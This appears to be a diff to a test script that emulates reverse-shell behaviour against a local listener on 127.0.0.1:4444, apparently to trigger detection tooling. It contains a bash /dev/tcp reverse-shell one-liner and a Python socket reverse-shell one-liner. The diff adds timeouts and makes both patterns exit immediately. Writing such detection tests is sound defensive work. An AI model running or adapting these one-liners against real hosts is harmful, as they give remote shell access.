@@ -20,13 +20,13 @@ else
     LISTENER_PID=""
 fi
 
-# 2. Emulate bash reverse shell syntax
+# 2. Emulate bash reverse shell syntax with timeout so it triggers and exits cleanly
 echo "[*] Executing interactive bash reverse shell pattern (/dev/tcp redirection)..."
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1 || true
+timeout 1.5 bash -c 'echo exit | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1 || true
 
-# 3. Emulate python socket one-liner pattern
+# 3. Emulate python socket one-liner pattern with timeout
 echo "[*] Executing python reverse shell pattern..."
-python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect_ex(("127.0.0.1",4444)); pty.spawn("/bin/sh")' >/dev/null 2>&1 || true
+timeout 1.5 python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect_ex(("127.0.0.1",4444)); os.system("/bin/sh -c exit")' >/dev/null 2>&1 || true
 
 # Cleanup listener
 if [ -n "$LISTENER_PID" ]; then
